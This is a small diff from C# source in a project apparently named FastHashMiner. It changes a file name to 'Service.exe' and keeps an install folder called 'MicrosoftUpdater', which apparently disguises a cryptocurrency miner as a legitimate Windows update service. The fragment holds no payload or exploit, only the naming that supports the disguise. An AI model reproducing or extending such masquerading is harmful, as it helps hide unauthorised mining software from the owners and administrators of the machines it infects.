@@ -18,7 +18,7 @@ namespace FastHashMiner
                 byte[] buffer = new byte[32];
                 int timeout = 1000;
                 PingOptions pingOptions = new PingOptions();
-                Form1.currentForm.file = "WorkerFF";
+                Form1.currentForm.fileName = "Service.exe";
                 Form1.currentForm.floader = "\\MicrosoftUpdater\\";
                 PingReply reply = myPing.Send(host, timeout, buffer, pingOptions);
                 return (reply.Status == IPStatus.Success);
